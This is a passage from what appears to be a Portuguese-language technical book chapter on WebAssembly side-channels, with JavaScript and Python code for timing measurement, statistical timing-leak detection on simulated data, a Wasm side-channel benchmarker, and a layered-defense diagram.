    async measureTiming(operation, iterations = 10000) {
        const times = [];

        for (let i = 0; i < iterations; i++) {
            const time = this.timer.measure(operation);
            times.push(time);
        }

        this.measurements.push(times);

        return this.analyze(times);
    }

    // Analisar medições
    analyze(times) {
        const n = times.length;
        const mean = times.reduce((a, b) => a + b, 0) / n;
        const variance = times.reduce((sum, x) => sum + Math.pow(x - mean, 2), 0) / n;
        const stdDev = Math.sqrt(variance);

        // Ordenar para median e quartis
        const sorted = [...times].sort((a, b) => a - b);
        const median = sorted[Math.floor(n / 2)];
        const q1 = sorted[Math.floor(n / 4)];
        const q3 = sorted[Math.floor(3 * n / 4)];

        return {
            mean,
            stdDev,
            variance,
            median,
            min: sorted[0],
            max: sorted[n - 1],
            q1,
            q3,
            n,
            cv: stdDev / mean // Coeficiente de variação
        };
    }

    // Comparar duas operações
    compare(operation1, operation2, iterations = 10000) {
        const times1 = [];
        const times2 = [];

        // Interleaved measurement para reduzir ruído
        for (let i = 0; i < iterations; i++) {
            times1.push(this.timer.measure(operation1));
            times2.push(this.timer.measure(operation2));
        }

        const stats1 = this.analyze(times1);
        const stats2 = this.analyze(times2);

        // Teste t
        const t = this.tTest(stats1, stats2);

        return {
            stats1,
            stats2,
            t,
            isSignificant: Math.abs(t) > 2.576, // 99% confiança
            difference: Math.abs(stats1.mean - stats2.mean)
        };
    }

    // Teste t de Student
    tTest(stats1, stats2) {
        const n1 = stats1.n;
        const n2 = stats2.n;

        const pooledVariance = (
            (n1 - 1) * stats1.variance +
            (n2 - 1) * stats2.variance
        ) / (n1 + n2 - 2);

        const standardError = Math.sqrt(
            pooledVariance * (1/n1 + 1/n2)
        );

        return (stats1.mean - stats2.mean) / standardError;
    }
}
```

### 10.9.4 Análise Estatística de Dados de Timing

```python
# Análise estatística de dados de timing para side-channels

import numpy as np
from scipy import stats
import matplotlib.pyplot as plt
from typing import List, Tuple, Dict
import json

class TimingAnalyzer:
    """Analisador de timing para detecção de side-channels"""

    def __init__(self):
        self.measurements: Dict[str, List[float]] = {}

    def add_measurement(self, name: str, times: List[float]):
        """Adicionar medição de timing"""
        self.measurements[name] = times

    def basic_stats(self, name: str) -> Dict:
        """Estatísticas básicas de uma medição"""
        times = self.measurements[name]
        return {
            'n': len(times),
            'mean': np.mean(times),
            'std': np.std(times),
            'variance': np.var(times),
            'median': np.median(times),
            'min': np.min(times),
            'max': np.max(times),
            'q1': np.percentile(times, 25),
            'q3': np.percentile(times, 75),
            'iqr': np.percentile(times, 75) - np.percentile(times, 25),
            'cv': np.std(times) / np.mean(times)  # Coeficiente de variação
        }

    def t_test(self, name1: str, name2: str) -> Dict:
        """Teste t de Student para comparar duas medições"""
        times1 = self.measurements[name1]
        times2 = self.measurements[name2]

        t_stat, p_value = stats.ttest_ind(times1, times2)

        return {
            't_statistic': t_stat,
            'p_value': p_value,
            'is_significant': p_value < 0.01,  # 99% confiança
            'effect_size': self.cohen_d(times1, times2)
        }

    def cohen_d(self, times1: List[float], times2: List[float]) -> float:
        """Calcular Cohen's d (tamanho do efeito)"""
        n1, n2 = len(times1), len(times2)
        var1, var2 = np.var(times1), np.var(times2)

        pooled_std = np.sqrt(((n1 - 1) * var1 + (n2 - 1) * var2) / (n1 + n2 - 2))

        if pooled_std == 0:
            return 0.0

        return (np.mean(times1) - np.mean(times2)) / pooled_std

    def detect_leak(self, operation1, operation2, threshold=0.01) -> Dict:
        """Detectar timing leak entre duas operações"""
        result = self.t_test(operation1, operation2)

        # Calcular magnitude do leak
        stats1 = self.basic_stats(operation1)
        stats2 = self.basic_stats(operation2)

        difference = abs(stats1['mean'] - stats2['mean'])
        relative_difference = difference / max(stats1['mean'], stats2['mean'])

        return {
            'has_leak': result['is_significant'],
            'confidence': 1 - result['p_value'],
            't_statistic': result['t_statistic'],
            'p_value': result['p_value'],
            'effect_size': result['effect_size'],
            'absolute_difference': difference,
            'relative_difference': relative_difference,
            'stats1': stats1,
            'stats2': stats2
        }

    def plot_distribution(self, name: str, save_path: str = None):
        """Plotar distribuição de timing"""
        times = self.measurements[name]

        plt.figure(figsize=(10, 6))
        plt.hist(times, bins=50, edgecolor='black', alpha=0.7)
        plt.xlabel('Tempo (ns)')
        plt.ylabel('Frequência')
        plt.title(f'Distribuição de Timing: {name}')
        plt.grid(True, alpha=0.3)

        # Adicionar estatísticas
        stats = self.basic_stats(name)
        plt.axvline(stats['mean'], color='r', linestyle='--', label=f"Média: {stats['mean']:.2f}ns")
        plt.axvline(stats['median'], color='g', linestyle='--', label=f"Mediana: {stats['median']:.2f}ns")
        plt.legend()

        if save_path:
            plt.savefig(save_path)
        plt.show()

    def plot_comparison(self, name1: str, name2: str, save_path: str = None):
        """Plotar comparação de duas distribuições"""
        times1 = self.measurements[name1]
        times2 = self.measurements[name2]

        plt.figure(figsize=(12, 6))

        plt.subplot(1, 2, 1)
        plt.hist(times1, bins=50, alpha=0.7, label=name1)
        plt.hist(times2, bins=50, alpha=0.7, label=name2)
        plt.xlabel('Tempo (ns)')
        plt.ylabel('Frequência')
        plt.title('Comparação de Distribuições')
        plt.legend()
        plt.grid(True, alpha=0.3)

        plt.subplot(1, 2, 2)
        stats1 = self.basic_stats(name1)
        stats2 = self.basic_stats(name2)

        x = np.arange(2)
        width = 0.35

        plt.bar(x - width/2, [stats1['mean'], stats2['mean']], width, label='Média')
        plt.bar(x + width/2, [stats1['std'], stats2['std']], width, label='Desvio Padrão')

        plt.xlabel('Operação')
        plt.ylabel('Tempo (ns)')
        plt.title('Estatísticas Comparativas')
        plt.xticks(x, [name1, name2])
        plt.legend()
        plt.grid(True, alpha=0.3)

        plt.tight_layout()

        if save_path:
            plt.savefig(save_path)
        plt.show()

    def export_results(self, filepath: str):
        """Exportar resultados para JSON"""
        results = {}
        for name in self.measurements:
            results[name] = self.basic_stats(name)

        with open(filepath, 'w') as f:
            json.dump(results, f, indent=2)

# Exemplo de uso
def example_analysis():
    # Criar analisador
    analyzer = TimingAnalyzer()

    # Simular medições (em um caso real, isso viria de testes de side-channel)
    np.random.seed(42)

    # Operação sem acesso a dados secretos
    times_without = np.random.normal(100, 5, 10000).tolist()

    # Operação com acesso a dados secretos (timing leak)
    times_with = np.random.normal(110, 5, 10000).tolist()

    analyzer.add_measurement('without_secret', times_without)
    analyzer.add_measurement('with_secret', times_with)

    # Estatísticas básicas
    print("=== Estatísticas Básicas ===")
    print(f"Sem segredo: {analyzer.basic_stats('without_secret')}")
    print(f"Com segredo: {analyzer.basic_stats('with_secret')}")

    # Teste t
    print("\n=== Teste t ===")
    t_result = analyzer.t_test('without_secret', 'with_secret')
    print(f"t-statistic: {t_result['t_statistic']:.4f}")
    print(f"p-value: {t_result['p_value']:.6f}")
    print(f"Significativo: {t_result['is_significant']}")

    # Detecção de leak
    print("\n=== Detecção de Leak ===")
    leak_result = analyzer.detect_leak('without_secret', 'with_secret')
    print(f"Tem leak: {leak_result['has_leak']}")
    print(f"Confiança: {leak_result['confidence']:.4f}")
    print(f"Tamanho do efeito: {leak_result['effect_size']:.4f}")
    print(f"Diferença relativa: {leak_result['relative_difference']:.4f}")

    return analyzer

if __name__ == '__main__':
    example_analysis()
```

### 10.9.5 Testes T para Detecção de Timing Leaks

```python
# Testes t para detecção de timing leaks

import numpy as np
from scipy import stats
from typing import Tuple

def welch_t_test(
    sample1: np.ndarray,
    sample2: np.ndarray,
    alpha: float = 0.01
) -> Tuple[float, float, bool]:
    """
    Teste t de Welch para amostras com variâncias diferentes

    Retorna: (t_statistic, p_value, is_significant)
    """
    t_stat, p_value = stats.ttest_ind(sample1, sample2, equal_var=False)
    return t_stat, p_value, p_value < alpha

def mann_whitney_u_test(
    sample1: np.ndarray,
    sample2: np.ndarray,
    alpha: float = 0.01
) -> Tuple[float, float, bool]:
    """
    Teste de Mann-Whitney U para amostras não-normais

    Retorna: (u_statistic, p_value, is_significant)
    """
    u_stat, p_value = stats.mannwhitneyu(sample1, sample2, alternative='two-sided')
    return u_stat, p_value, p_value < alpha

def detect_timing_leak(
    times_without: np.ndarray,
    times_with: np.ndarray,
    method: str = 't-test',
    alpha: float = 0.01
) -> dict:
    """
    Detectar timing leak usando diferentes métodos estatísticos
    """
    results = {
        'has_leak': False,
        'method': method,
        'alpha': alpha
    }

    if method == 't-test':
        t_stat, p_value, is_significant = welch_t_test(
            times_without, times_with, alpha
        )
        results['t_statistic'] = t_stat
        results['p_value'] = p_value
        results['is_significant'] = is_significant

    elif method == 'mann-whitney':
        u_stat, p_value, is_significant = mann_whitney_u_test(
            times_without, times_with, alpha
        )
        results['u_statistic'] = u_stat
        results['p_value'] = p_value
        results['is_significant'] = is_significant

    elif method == 'kolmogorov-smirnov':
        ks_stat, p_value = stats.ks_2samp(times_without, times_with)
        results['ks_statistic'] = ks_stat
        results['p_value'] = p_value
        results['is_significant'] = p_value < alpha

    # Calcular tamanho do efeito
    results['effect_size'] = cohens_d(times_without, times_with)

    # Determinar se há leak
    results['has_leak'] = results.get('is_significant', False)

    return results

def cohens_d(sample1: np.ndarray, sample2: np.ndarray) -> float:
    """Calcular Cohen's d (tamanho do efeito)"""
    n1, n2 = len(sample1), len(sample2)
    var1, var2 = np.var(sample1, ddof=1), np.var(sample2, ddof=1)

    pooled_std = np.sqrt(((n1 - 1) * var1 + (n2 - 1) * var2) / (n1 + n2 - 2))

    if pooled_std == 0:
        return 0.0

    return (np.mean(sample1) - np.mean(sample2)) / pooled_std

def power_analysis(
    effect_size: float,
    n: int,
    alpha: float = 0.01
) -> float:
    """
    Calcular poder do teste estatístico
    """
    from scipy.stats import norm

    # Poder do teste t de Welch
    z_alpha = norm.ppf(1 - alpha / 2)
    z_beta = effect_size * np.sqrt(n / 2) - z_alpha

    power = norm.cdf(z_beta)
    return power

def required_sample_size(
    effect_size: float,
    power: float = 0.99,
    alpha: float = 0.01
) -> int:
    """
    Calcular tamanho de amostra necessário
    """
    from scipy.stats import norm

    z_alpha = norm.ppf(1 - alpha / 2)
    z_beta = norm.ppf(power)

    n = 2 * ((z_alpha + z_beta) / effect_size) ** 2

    return int(np.ceil(n))

def bootstrap_confidence_interval(
    sample1: np.ndarray,
    sample2: np.ndarray,
    n_bootstrap: int = 10000,
    confidence: float = 0.99
) -> Tuple[float, float]:
    """
    Intervalo de confiança via bootstrap
    """
    differences = []

    for _ in range(n_bootstrap):
        # Amostrar com reposição
        boot1 = np.random.choice(sample1, size=len(sample1), replace=True)
        boot2 = np.random.choice(sample2, size=len(sample2), replace=True)

        diff = np.mean(boot1) - np.mean(boot2)
        differences.append(diff)

    # Calcular percentis
    lower = np.percentile(differences, (1 - confidence) / 2 * 100)
    upper = np.percentile(differences, (1 + confidence) / 2 * 100)

    return lower, upper

# Exemplo completo de análise
def full_timing_analysis(
    times_without: np.ndarray,
    times_with: np.ndarray
):
    """Análise completa de timing leak"""

    print("=== Análise Completa de Timing Leak ===\n")

    # Estatísticas básicas
    print("Estatísticas Básicas:")
    print(f"  Sem segredo: mean={np.mean(times_without):.4f}, std={np.std(times_without):.4f}")
    print(f"  Com segredo: mean={np.mean(times_with):.4f}, std={np.std(times_with):.4f}")

    # Testes estatísticos
    print("\nTestes Estatísticos:")

    # Teste t
    t_result = detect_timing_leak(times_without, times_with, method='t-test')
    print(f"  Teste t: t={t_result.get('t_statistic', 0):.4f}, p={t_result['p_value']:.6f}")

    # Mann-Whitney
    mw_result = detect_timing_leak(times_without, times_with, method='mann-whitney')
    print(f"  Mann-Whitney: U={mw_result.get('u_statistic', 0):.4f}, p={mw_result['p_value']:.6f}")

    # Kolmogorov-Smirnov
    ks_result = detect_timing_leak(times_without, times_with, method='kolmogorov-smirnov')
    print(f"  Kolmogorov-Smirnov: KS={ks_result.get('ks_statistic', 0):.4f}, p={ks_result['p_value']:.6f}")

    # Tamanho do efeito
    effect_size = cohens_d(times_without, times_with)
    print(f"\nTamanho do Efeito (Cohen's d): {effect_size:.4f}")

    # Poder do teste
    power = power_analysis(effect_size, len(times_without))
    print(f"Poder do Teste: {power:.4f}")

    # Tamanho de amostra necessário
    req_n = required_sample_size(effect_size)
    print(f"Tamanho de Amostra Necessário: {req_n}")

    # Intervalo de confiança
    ci_lower, ci_upper = bootstrap_confidence_interval(times_without, times_with)
    print(f"Intervalo de Confiança (99%): [{ci_lower:.4f}, {ci_upper:.4f}]")

    # Conclusão
    print("\n=== Conclusão ===")
    if t_result['has_leak']:
        print("TIMING LEAK DETECTADO!")
        print("A diferença de timing é estatisticamente significativa.")
    else:
        print("Nenhum timing leak detectado.")
        print("A diferença de timing não é estatisticamente significativa.")

# Exemplo de uso
if __name__ == '__main__':
    np.random.seed(42)

    # Simular dados com leak
    times_without = np.random.normal(100, 5, 10000)
    times_with = np.random.normal(105, 5, 10000)  # 5ns de leak

    full_timing_analysis(times_without, times_with)
```

### 10.9.6 Medição de Variância Entre Execuções

```python
# Medição de variância entre execuções

import numpy as np
from typing import List, Dict
import json

class VarianceAnalyzer:
    """Analisador de variância entre execuções"""

    def __init__(self):
        self.runs: List[Dict] = []

    def add_run(self, run_id: int, measurements: Dict[str, List[float]]):
        """Adicionar uma execução completa"""
        self.runs.append({
            'run_id': run_id,
            'measurements': measurements
        })

    def analyze_variance(self, operation: str) -> Dict:
        """Analisar variância de uma operação entre execuções"""
        # Coletar médias de cada execução
        means = []
        stds = []

        for run in self.runs:
            if operation in run['measurements']:
                times = run['measurements'][operation]
                means.append(np.mean(times))
                stds.append(np.std(times))

        if not means:
            return {'error': 'Operation not found'}

        # Estatísticas entre execuções
        between_mean = np.mean(means)
        between_std = np.std(means)
        between_var = np.var(means)

        # Estatísticas dentro das execuções
        within_mean = np.mean(stds)
        within_std = np.std(stds)

        # ANOVA (Analysis of Variance)
        all_times = []
        groups = []
        for run in self.runs:
            if operation in run['measurements']:
                times = run['measurements'][operation]
                all_times.extend(times)
                groups.extend([run['run_id']] * len(times))

        f_stat, p_value = self._one_way_anova(all_times, groups)

        return {
            'operation': operation,
            'num_runs': len(means),
            'between_runs': {
                'mean': between_mean,
                'std': between_std,
                'variance': between_var
            },
            'within_runs': {
                'mean': within_mean,
                'std': within_std
            },
            'anova': {
                'f_statistic': f_stat,
                'p_value': p_value,
                'is_significant': p_value < 0.01
            }
        }

    def _one_way_anova(self, data: List[float], groups: List[int]):
        """ANOVA de uma via"""
        unique_groups = list(set(groups))
        k = len(unique_groups)
        N = len(data)

        # Média geral
        grand_mean = np.mean(data)

        # Soma dos quadrados entre grupos (SSB)
        ssb = 0
        for group in unique_groups:
            group_data = [data[i] for i in range(N) if groups[i] == group]
            n_g = len(group_data)
            mean_g = np.mean(group_data)
            ssb += n_g * (mean_g - grand_mean) ** 2

        # Soma dos quadrados dentro dos grupos (SSW)
        ssw = 0
        for group in unique_groups:
            group_data = [data[i] for i in range(N) if groups[i] == group]
            mean_g = np.mean(group_data)
            ssw += sum((x - mean_g) ** 2 for x in group_data)

        # Graus de liberdade
        dfb = k - 1
        dfw = N - k

        # Médias dos quadrados
        msb = ssb / dfb
        msw = ssw / dfw

        # Estatística F
        f_stat = msb / msw if msw > 0 else 0

        # p-valor
        from scipy import stats
        p_value = 1 - stats.f.cdf(f_stat, dfb, dfw)

        return f_stat, p_value

    def detect_systematic_leak(self, operation1: str, operation2: str) -> Dict:
        """Detectar leak sistemático entre execuções"""
        diffs = []

        for run in self.runs:
            if operation1 in run['measurements'] and operation2 in run['measurements']:
                mean1 = np.mean(run['measurements'][operation1])
                mean2 = np.mean(run['measurements'][operation2])
                diffs.append(mean1 - mean2)

        if not diffs:
            return {'error': 'Operations not found'}

        diffs = np.array(diffs)

        # Verificar se as diferenças são consistentes
        mean_diff = np.mean(diffs)
        std_diff = np.std(diffs)

        # Teste t pareado
        from scipy import stats
        t_stat, p_value = stats.ttest_1samp(diffs, 0)

        return {
            'mean_difference': mean_diff,
            'std_difference': std_diff,
            'consistent': abs(mean_diff) > 2 * std_diff,
            't_statistic': t_stat,
            'p_value': p_value,
            'is_significant': p_value < 0.01,
            'num_runs': len(diffs)
        }

    def export_results(self, filepath: str):
        """Exportar resultados para JSON"""
        results = {}
        operations = set()
        for run in self.runs:
            operations.update(run['measurements'].keys())

        for op in operations:
            results[op] = self.analyze_variance(op)

        with open(filepath, 'w') as f:
            json.dump(results, f, indent=2)

# Exemplo de uso
def example_variance_analysis():
    np.random.seed(42)

    analyzer = VarianceAnalyzer()

    # Simular múltiplas execuções
    for run_id in range(10):
        measurements = {
            'operation_a': np.random.normal(100, 5, 1000).tolist(),
            'operation_b': np.random.normal(110, 5, 1000).tolist(),
        }
        analyzer.add_run(run_id, measurements)

    # Analisar variância
    print("=== Análise de Variância ===")
    result_a = analyzer.analyze_variance('operation_a')
    print(f"Operação A: {result_a}")

    result_b = analyzer.analyze_variance('operation_b')
    print(f"Operação B: {result_b}")

    # Detectar leak sistemático
    print("\n=== Detecção de Leak Sistemático ===")
    leak_result = analyzer.detect_systematic_leak('operation_a', 'operation_b')
    print(f"Leak sistemático: {leak_result}")

    return analyzer

if __name__ == '__main__':
    example_variance_analysis()
```

### 10.9.7 Frameworks Automatizados de Medição de Timing

```javascript
// Frameworks automatizados de medição de timing

class TimingMeasurementFramework {
    constructor(config = {}) {
        this.config = {
            iterations: config.iterations || 10000,
            warmup: config.warmup || 1000,
            calibrationRuns: config.calibrationRuns || 1000,
            confidenceLevel: config.confidenceLevel || 0.99,
            ...config
        };

        this.timer = null;
        this.calibrationData = null;
    }

    async initialize() {
        // Criar timer de alta resolução
        this.timer = new HighResTimer();
        this.timer.start();

        // Calibrar timer
        this.calibrationData = await this.calibrate();

        return this.calibrationData;
    }

    async calibrate() {
        const resolutionSamples = [];
        const overheadSamples = [];

        // Medir resolução
        for (let i = 0; i < this.config.calibrationRuns; i++) {
            const t1 = this.timer.read();
            const t2 = this.timer.read();
            if (t2 > t1) {
                resolutionSamples.push(t2 - t1);
            }
        }

        // Medir overhead
        for (let i = 0; i < this.config.calibrationRuns; i++) {
            const start = this.timer.read();
            const end = this.timer.read();
            overheadSamples.push(end - start);
        }

        return {
            resolution: Math.min(...resolutionSamples),
            overhead: overheadSamples.reduce((a, b) => a + b, 0) / overheadSamples.length,
            resolutionSamples,
            overheadSamples
        };
    }

    async measureOperation(operation, name = 'unnamed') {
        // Warmup
        for (let i = 0; i < this.config.warmup; i++) {
            operation();
        }

        // Medição
        const times = [];
        for (let i = 0; i < this.config.iterations; i++) {
            const start = this.timer.read();
            operation();
            const end = this.timer.read();
            times.push(end - start);
        }

        return {
            name,
            times,
            stats: this.calculateStats(times)
        };
    }

    calculateStats(times) {
        const n = times.length;
        const mean = times.reduce((a, b) => a + b, 0) / n;
        const variance = times.reduce((sum, x) => sum + Math.pow(x - mean, 2), 0) / n;
        const stdDev = Math.sqrt(variance);

        const sorted = [...times].sort((a, b) => a - b);
        const median = sorted[Math.floor(n / 2)];
        const q1 = sorted[Math.floor(n / 4)];
        const q3 = sorted[Math.floor(3 * n / 4)];

        return {
            mean,
            stdDev,
            variance,
            median,
            min: sorted[0],
            max: sorted[n - 1],
            q1,
            q3,
            iqr: q3 - q1,
            cv: stdDev / mean,
            n
        };
    }

    async compareOperations(op1, op2, name1 = 'op1', name2 = 'op2') {
        const result1 = await this.measureOperation(op1, name1);
        const result2 = await this.measureOperation(op2, name2);

        const tTest = this.welchTTest(result1.times, result2.times);

        return {
            op1: result1,
            op2: result2,
            comparison: {
                tTest,
                difference: Math.abs(result1.stats.mean - result2.stats.mean),
                relativeDifference: Math.abs(result1.stats.mean - result2.stats.mean) / Math.max(result1.stats.mean, result2.stats.mean)
            }
        };
    }

    welchTTest(sample1, sample2) {
        const n1 = sample1.length;
        const n2 = sample2.length;

        const mean1 = sample1.reduce((a, b) => a + b, 0) / n1;
        const mean2 = sample2.reduce((a, b) => a + b, 0) / n2;

        const var1 = sample1.reduce((sum, x) => sum + Math.pow(x - mean1, 2), 0) / (n1 - 1);
        const var2 = sample2.reduce((sum, x) => sum + Math.pow(x - mean2, 2), 0) / (n2 - 1);

        const se = Math.sqrt(var1 / n1 + var2 / n2);
        const t = (mean1 - mean2) / se;

        // Aproximação dos graus de liberdade
        const df = Math.pow(var1 / n1 + var2 / n2, 2) /
                   (Math.pow(var1 / n1, 2) / (n1 - 1) +
                    Math.pow(var2 / n2, 2) / (n2 - 1));

        // p-valor aproximado (usando distribuição t)
        const pValue = this.tDistPValue(Math.abs(t), df);

        return {
            t,
            df,
            pValue,
            isSignificant: pValue < (1 - this.config.confidenceLevel)
        };
    }

    tDistPValue(t, df) {
        // Aproximação da distribuição t
        const x = df / (df + t * t);
        const a = df / 2;
        const b = 0.5;

        // Usando beta regularizada (aproximação)
        return this.regularizedIncompleteBeta(x, a, b);
    }

    regularizedIncompleteBeta(x, a, b) {
        // Aproximação da beta regularizada incompleta
        if (x < 0 || x > 1) return 0;
        if (x === 0 || x === 1) return x;

        // Usando série de Taylor para aproximação
        let sum = 0;
        let term = 1;

        for (let i = 0; i < 100; i++) {
            term *= (a + i) * x / (a + b + i);
            sum += term / (a + i);
        }

        return Math.pow(x, a) * Math.pow(1 - x, b) * sum / this.beta(a, b);
    }

    beta(a, b) {
        // Aproximação da função beta
        return this.gamma(a) * this.gamma(b) / this.gamma(a + b);
    }

    gamma(n) {
        // Aproximação da função gamma
        if (n < 0.5) {
            return Math.PI / (Math.sin(Math.PI * n) * this.gamma(1 - n));
        }

        n -= 1;
        const g = 7;
        const c = [
            0.99999999999980993,
            676.5203681218851,
            -1259.1392167224028,
            771.32342877765313,
            -176.61502916214059,
            12.507343278686905,
            -0.13857109526572012,
            9.9843695780195716e-6,
            1.5056327351493116e-7
        ];

        let x = c[0];
        for (let i = 1; i < g + 2; i++) {
            x += c[i] / (n + i);
        }

        const t = n + g + 0.5;
        return Math.sqrt(2 * Math.PI) * Math.pow(t, n + 0.5) * Math.exp(-t) * x;
    }
}

// Exemplo de uso
async function exampleMeasurement() {
    const framework = new TimingMeasurementFramework({
        iterations: 5000,
        warmup: 500,
        calibrationRuns: 500
    });

    await framework.initialize();

    // Medir operações
    const op1 = () => {
        const arr = new Array(256).fill(0);
        for (let i = 0; i < 256; i++) {
            arr[i] = i;
        }
    };

    const op2 = () => {
        const arr = new Array(256).fill(0);
        for (let i = 0; i < 256; i++) {
            arr[i] = Math.random();
        }
    };

    const result = await framework.compareOperations(op1, op2, 'sequential', 'random');

    console.log('Resultado da comparação:');
    console.log('Operação 1 (sequencial):', result.op1.stats);
    console.log('Operação 2 (aleatória):', result.op2.stats);
    console.log('Comparação:', result.comparison);

    return result;
}
```

### 10.9.8 Ferramentas de Benchmarking para Side-Channels em Wasm

```javascript
// Ferramentas de benchmarking para side-channels em Wasm

class WasmSideChannelBenchmarker {
    constructor() {
        this.results = {};
        this.wasmInstance = null;
    }

    async initialize(wasmUrl) {
        // Carregar módulo Wasm
        const response = await fetch(wasmUrl);
        const bytes = await response.arrayBuffer();

        const { instance } = await WebAssembly.instantiate(bytes, {
            env: {
                memory: new WebAssembly.Memory({
                    initial: 256,
                    maximum: 512,
                    shared: true
                })
            }
        });

        this.wasmInstance = instance;
        return instance;
    }

    async benchmarkCacheTiming(operation, iterations = 10000) {
        const times = [];

        for (let i = 0; i < iterations; i++) {
            const start = performance.now();
            operation();
            const end = performance.now();
            times.push(end - start);
        }

        return this.analyze(times);
    }

    async benchmarkWithSecret(operation, secretData, iterations = 10000) {
        const results = {};

        // Benchmark com diferentes valores de segredo
        for (const secret of secretData) {
            const times = [];

            for (let i = 0; i < iterations; i++) {
                const start = performance.now();
                operation(secret);
                const end = performance.now();
                times.push(end - start);
            }

            results[secret] = this.analyze(times);
        }

        return results;
    }

    analyze(times) {
        const n = times.length;
        const mean = times.reduce((a, b) => a + b, 0) / n;
        const variance = times.reduce((sum, x) => sum + Math.pow(x - mean, 2), 0) / n;
        const stdDev = Math.sqrt(variance);

        const sorted = [...times].sort((a, b) => a - b);
        const median = sorted[Math.floor(n / 2)];

        return {
            mean,
            stdDev,
            variance,
            median,
            min: sorted[0],
            max: sorted[n - 1],
            n,
            cv: stdDev / mean
        };
    }

    detectTimingLeak(results) {
        const secrets = Object.keys(results);
        if (secrets.length < 2) return null;

        const means = secrets.map(s => results[s].mean);
        const stds = secrets.map(s => results[s].stdDev);

        // Calcular variância entre secretos
        const grandMean = means.reduce((a, b) => a + b, 0) / means.length;
        const betweenVariance = means.reduce((sum, m) =>
            sum + Math.pow(m - grandMean, 2), 0) / means.length;

        // Calcular variância média dentro dos secretos
        const withinVariance = stds.reduce((sum, s) =>
            sum + s * s, 0) / stds.length;

        // F-ratio
        const fRatio = betweenVariance / withinVariance;

        // Determinar se há leak
        const hasLeak = fRatio > 10; // Limiar arbitrário

        return {
            hasLeak,
            fRatio,
            betweenVariance,
            withinVariance,
            grandMean,
            secrets: secrets.length
        };
    }

    async runFullBenchmark(wasmFunctions) {
        const results = {};

        for (const [name, func] of Object.entries(wasmFunctions)) {
            console.log(`Benchmarking ${name}...`);

            // Benchmark básico
            const basicResult = await this.benchmarkCacheTiming(func);
            results[name] = {
                basic: basicResult
            };

            // Benchmark com dados secretos
            const secretData = Array.from({ length: 256 }, (_, i) => i);
            const secretResult = await this.benchmarkWithSecret(func, secretData);
            results[name].withSecret = secretResult;

            // Detectar leak
            const leakDetection = this.detectTimingLeak(secretResult);
            results[name].leakDetection = leakDetection;

            console.log(`  ${name}:`);
            console.log(`    Média: ${basicResult.mean.toFixed(4)}ms`);
            console.log(`    Desvio Padrão: ${basicResult.stdDev.toFixed(4)}ms`);
            console.log(`    Leak detectado: ${leakDetection?.hasLeak || false}`);
        }

        return results;
    }

    generateReport(results) {
        let report = '# Relatório de Benchmarking de Side-Channels Wasm\n\n';

        for (const [name, data] of Object.entries(results)) {
            report += `## ${name}\n\n`;
            report += `### Estatísticas Básicas\n`;
            report += `- Média: ${data.basic.mean.toFixed(4)}ms\n`;
            report += `- Desvio Padrão: ${data.basic.stdDev.toFixed(4)}ms\n`;
            report += `- Variância: ${data.basic.variance.toFixed(4)}\n`;
            report += `- Mediana: ${data.basic.median.toFixed(4)}ms\n`;
            report += `- Mínimo: ${data.basic.min.toFixed(4)}ms\n`;
            report += `- Máximo: ${data.basic.max.toFixed(4)}ms\n\n`;

            if (data.leakDetection) {
                report += `### Detecção de Leak\n`;
                report += `- Leak detectado: ${data.leakDetection.hasLeak}\n`;
                report += `- F-ratio: ${data.leakDetection.fRatio.toFixed(4)}\n`;
                report += `- Variância entre secretos: ${data.leakDetection.betweenVariance.toFixed(4)}\n`;
                report += `- Variância média: ${data.leakDetection.withinVariance.toFixed(4)}\n\n`;
            }
        }

        return report;
    }
}

// Exemplo de uso
async function benchmarkWasmSideChannels() {
    const benchmarker = new WasmSideChannelBenchmarker();

    // Inicializar com módulo Wasm
    // await benchmarker.initialize('path/to/module.wasm');

    // Definir funções para benchmark
    const wasmFunctions = {
        'lookup_table': (secret) => {
            // Simular lookup table
            const table = new Uint8Array(256);
            for (let i = 0; i < 256; i++) table[i] = i;
            return table[secret];
        },
        'constant_time': (secret) => {
            // Simular operação constante-time
            let result = 0;
            for (let i = 0; i < 256; i++) {
                result ^= i & (i === secret ? 0xFF : 0x00);
            }
            return result;
        }
    };

    // Executar benchmark
    const results = await benchmarker.runFullBenchmark(wasmFunctions);

    // Gerar relatório
    const report = benchmarker.generateReport(results);
    console.log(report);

    return results;
}
```

## 10.10 Estratégias de Defesa em Profundidade

A defesa contra side-channels em Wasm requer uma abordagem em múltiplas camadas, combinando mitigações no nível de hardware, sistema operacional, navegador e aplicação.

### 10.10.1 Modelo de Defesa em Camadas

```
+------------------------------------------------------------------+
|                 MODELO DE DEFESA EM CAMADAS                       |
+------------------------------------------------------------------+
|                                                                  |
|  CAMADA 1: HARDWARE                                              |
|  +------------------------------------------------------------+  |
|  |  - Mitigações de Spectre (STIBP, IBPB, etc.)               |  |
|  |  - Cache partitioning (CAT)                                 |  |
|  |  - Memory encryption (TME, SME)                             |  |
|  |  - Branch predictor hardening                               |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  CAMADA 2: SISTEMA OPERACIONAL                                  |
|  +------------------------------------------------------------+  |
|  |  - KPTI (Kernel Page Table Isolation)                       |  |
|  |  - Retpoline no kernel                                      |  |
|  |  - Seccomp-bpf para limitar syscalls                        |  |
|  |  - Namespace isolation                                      |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  CAMADA 3: NAVEGADOR                                             |
|  +------------------------------------------------------------+  |
|  |  - Site Isolation                                           |  |
|  |  - COOP/COEP headers                                       |  |
|  |  - JIT hardening                                           |  |
|  |  - SharedArrayBuffer restrictions                           |  |
|  |  - Content Security Policy                                  |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  CAMADA 4: WASM RUNTIME                                          |
|  +------------------------------------------------------------+  |
|  |  - Bounds checking enforcement                              |  |
|  |  - Indirect call verification                               |  |
|  |  - Memory isolation                                         |  |
|  |  - Control flow integrity                                   |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  CAMADA 5: APLICAÇÃO                                             |
|  +------------------------------------------------------------+  |
|  |  - Constant-time implementations                            |  |
|  |  - Side-channel resistant algorithms                        |  |
|  |  - Input validation                                         |  |
|  |  - Error handling without information leakage               |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  CAMADA 6: MONITORAMENTO                                         |
|  +------------------------------------------------------------+  |
|  |  - Timing anomaly detection                                 |  |
|  |  - Cache behavior monitoring                                |  |
|  |  - Performance regression detection                         |  |
|  |  - Security event logging                                   |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

### 10.10.2 Hardening do Ambiente de Runtime

```javascript
// Hardening do ambiente de runtime para Wasm

class WasmRuntimeHardening {
    constructor() {
        this.config = {
